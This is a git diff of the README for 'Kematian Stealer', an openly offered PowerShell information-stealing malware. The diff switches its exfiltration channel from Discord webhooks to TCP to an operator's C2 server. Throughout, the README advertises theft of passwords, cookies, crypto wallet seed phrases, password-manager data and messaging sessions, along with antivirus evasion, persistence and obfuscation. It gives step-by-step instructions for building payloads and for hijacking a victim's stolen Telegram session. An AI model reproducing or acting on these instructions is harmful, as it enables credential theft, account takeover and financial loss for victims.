@@ -1,5 +1,5 @@
 <p align="center">
-<img src="https://github.com/Chainski/Kematian-Stealer/assets/96607632/345004a3-756a-43a6-9a27-8f09884bdc3e", width="400", height="400">
+<img src="https://github.com/Chainski/Kematian-Stealer-V3/assets/96607632/fcc724c2-d1c1-4248-9d1e-e61793fa7ff7", width="400", height="400">
 </p>
 
 <div align="center">
@@ -38,33 +38,37 @@
 <h1 align="center">Kematian Stealer</h1>
 
 # About The Project
-Kematian Stealer is a [PowerShell-based](https://learn.microsoft.com/en-us/powershell/scripting/overview?view=powershell-5.1) tool designed to effortlessly infiltrate and exfiltrate data from Windows systems. All information collected is sent using [Discord webhooks](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks). It functions seamlessly across any `x64bit` system, from `Windows 8 x64 to Windows 11 x64`, ensuring compatibility with the latest updates. With Kematian Stealer, you can retrieve `seed phrases, session files, passwords, application data, Discord tokens` and more.
+Kematian Stealer is a [PowerShell-based](https://learn.microsoft.com/en-us/powershell/scripting/overview?view=powershell-5.1) tool designed to effortlessly infiltrate and exfiltrate data from Windows systems. All information collected is transmitted via TCP to your C2 server, where everything is decrypted. It functions seamlessly across any `x64bit` system, from `Windows 8 x64 to Windows 11 x64`, ensuring compatibility with the latest updates. With Kematian Stealer, you can retrieve `seed phrases, session files, passwords, application data, Discord tokens` and more.
 
 This tool is particularly advantageous for accessing application and file data without restrictions, while evading conventional security measures such as `firewalls` and `antivirus` software, thanks to its `fileless capabilities`, which set it apart from other stealers. Upon execution, Kematian Stealer creates a `mutex` on the system and designates the process as `critical` before initiating data exfiltration, ensuring smooth and uninterrupted transmission of data.
 
-Moreover, the tool has robust `persistence mechanisms` to remain active on the machine after reboot. Additionally, its user-friendly `GUI builder` simplifies the process of creating payloads, enhancing its accessibility and usability.
+Moreover, the tool has robust `persistence mechanisms` to remain active on the machine after reboot. Additionally, its user-friendly web-based `GUI builder` simplifies the process of creating payloads, enhancing its accessibility and usability.
 <br>
 
 # Usage
-- Create a Webhook on your [Discord Server](https://discord.com), it's advisable to create a new server for this purpose.
-- After creating a server go to `Edit channel` > `Integrations` > `Webhooks` > `Create Webhook`
-- Copy the `Webhook URL`
-- Download [main.ps1](https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/main.ps1) 
-- Open `main.ps1` and replace `YOUR_WEBHOOK_HERE` in line `1` with your webhook or use the [builder](https://github.com/ChildrenOfYahweh/Kematian-Stealer/releases/tag/Builder).
-- Additionally, set `$true` for the variables you wish to activate. Conversely, utilize `$false` to deactivate them, as shown in `configurations` below.
+- Download [Builder](https://github.com/Somali-Devs/Kematian-Stealer-V3/releases/download/AutoBuild/main.exe) from the releases.
+- Open the builder you will get a message like this : `Private key and certificate have been generated and saved.`
+- The builder will start a local server after running which will run on `https://127.0.0.1:8080` by default.
+- Open your web browser and go to `https://127.0.0.1:8080/builder`
+- Input your C2 server in the `TCP TUNNEL URL:PORT` section
+- Next, activate the checkboxes for the features you want to include in the stub.
+- Finally hit build and the output stub will be placed in the same folder with the builder
  
  > [!NOTE]   
  > **THE DEBUG OPTION IS FOR TESTING PURPOSES ONLY**
 
 ### Configurations
 ```ps1
-$webhook = "YOUR_WEBHOOK_HERE" 
+$c2_server = "YOUR_URL_HERE_SERVER" 
 $debug = $false
-$blockhostsfile = $true
-$criticalprocess = $true
+$blockhostsfile = $false
+$criticalprocess = $false
 $melt = $false
 $fakeerror = $false
-$persistence = $true
+$persistence = $false
+$write_disk_only = $false
+$vm_protect = $false
+$encryption_key = "YOUR_ENC_KEY_HERE"
 ```
 
 # Requirements
@@ -79,7 +83,8 @@ $persistence = $true
 
 # Screenshots
   ## 🔨 Builder
-> ![builder](https://github.com/Chainski/Kematian-Stealer/assets/96607632/a282e7db-6357-483b-b33e-e122007c82f5)
+> ![builder](https://github.com/Chainski/Kematian-Stealer-V3/assets/96607632/149617d5-1536-441e-a6a0-505cf0b68413)
+
 
    ### Builder Features
  - [x] 🔸 Obfuscation of `BAT` and `PS1` files
@@ -87,9 +92,9 @@ $persistence = $true
  - [x] 💉 Pump/Inject the output exe file with `zero-filled` bytes 
 
  ## 🔷 Webhook Data
-> ![screenshot](https://github.com/Chainski/Kematian-Stealer/assets/96607632/964a67e6-ebf1-497c-a3ea-4efcdb24893b)
+> ![screenshot](https://github.com/Chainski/Kematian-Stealer-V3/assets/96607632/00bb2af3-2320-4103-904e-4a85468f65ad)
 
-> ![webhook](https://github.com/Chainski/Kematian-Stealer/assets/96607632/ae6cc514-9612-4c44-9afb-c110ee270194)
+> ![webhook](https://github.com/Chainski/Kematian-Stealer-V3/assets/96607632/9240ea38-1716-4737-bf06-7ee741a0be1d)
 
 #  Features
 - [x] GUI Builder
@@ -128,11 +133,14 @@ $persistence = $true
   - [OpenVPN](https://openvpn.net/client)
   - [x] Email Clients
   - [Thunderbird](https://www.thunderbird.net)
+  - [Mailbird](https://www.getmailbird.com) 
   - [x] FTP Clients
   - [FileZilla](https://filezilla-project.org)
   - [WinSCP](https://winscp.net/eng/index.php)
   - [x] Crypto Wallets
-  - Armory | Atomic | Bitcoin | Bytecoin | Coinomi | Dash | Electrum | Ethereum | Exodus | Guarda | Jaxx | Litecoin | Monero | Zephyr
+  - Collects from 10+ desktop wallets and 20+ browser extensions.
+  - [x] Password Managers
+  - Collects from 9 major password extensions 
 - [x] Browsers `Gecko Browsers` and `Chromium Browsers`
   - 🔑 Passwords
   - 🍪 Cookies
@@ -148,13 +156,13 @@ $persistence = $true
 - [x] Self-Destructs After Execution (optional)
 
 ### Telegram Session Stealer Usage :
-After the exfiltrated data is uploaded to your discord webhook, download the zip file and extract it on your PC, inside that folder there will also be another subfolder `Messaging Sessions` , inside this subfolder you will find the `Telegram` folder.
+After the exfiltrated data is uploaded to your C2 server, download the zip file and extract it on your PC, inside that folder there will also be another subfolder `Messaging Sessions` , inside this subfolder you will find the `Telegram` folder.
 Now, copy the `tdata` folder from `Telegram` folder and paste it in the directory below:
 ```bat
 %userprofile%\AppData\Roaming\Telegram Desktop
 ```
 Before pasting the tdata folder, ensure that you have deleted or backup the existing tdata folder on your PC.
-![telegram](https://github.com/Chainski/Kematian-Stealer/assets/96607632/488242f5-bcc2-4388-8f40-f4e88d98a4ba)
+![telegram](https://github.com/Chainski/Kematian-Stealer-V3/assets/96607632/31dabb20-1135-43e3-adff-3764260f53ef)
 
  > [!NOTE]   
  > ***The other session stealers can be utilized by applying the technique above***
@@ -203,7 +211,7 @@ Cleanup
 Found a bug? Have an idea? Let me know [here](https://github.com/KDot227/Kematian-Stealer/issues), Please provide a detailed explanation of the expected behavior, actual behavior, and steps to reproduce, or what you want to see and how it could be done. You can be a small part of this project!
 
 # License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/kdot227/Kematian-Stealer/blob/main/LICENSE) file for details
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Somali-Devs/Kematian-Stealer-V3/blob/main/LICENSE) file for details
 
 # Disclaimer
 I, the creator, am not responsible for any actions, and or damages, caused by this software.
@@ -215,6 +223,7 @@ By using this software, you automatically agree to the above.
 - https://github.com/KDot227
 - https://github.com/Chainski
 - https://github.com/EvilBytecode
-- [Credit](https://t.me/ebthit)
+- [ebthit](https://t.me/ebthit)
+- [Smug246](https://github.com/Smug246)
 
 <p align="center"><a href=#top>Back to Top</a></p>
